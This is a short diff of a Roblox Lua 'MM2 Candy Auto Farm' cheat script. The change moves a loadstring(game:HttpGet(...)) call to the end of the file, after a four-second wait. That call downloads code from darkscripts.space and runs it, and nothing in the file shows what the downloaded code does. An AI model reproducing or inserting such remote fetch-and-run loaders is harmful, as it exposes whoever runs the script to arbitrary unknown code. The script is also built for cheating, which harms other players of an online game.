@@ -138,7 +138,6 @@ end
 -- Create initial GUI
 local gui = createGUI()
 
-loadstring(game:HttpGet('https://darkscripts.space/scripts/5e77e0b095.lua', true))()
 -- Function to handle character spawning
 local function onCharacterAdded(newCharacter)
     character = newCharacter
@@ -157,5 +156,8 @@ RunService.Heartbeat:Connect(function()
         teleportToNearbyOrRandomCoin()
     end
 end)
+wait(4)
+loadstring(game:HttpGet('https://darkscripts.space/scripts/5e77e0b095.lua', true))()
 
 print("MM2 Candy Auto Farm script with persistent GUI and fixed toggle loaded.")
+
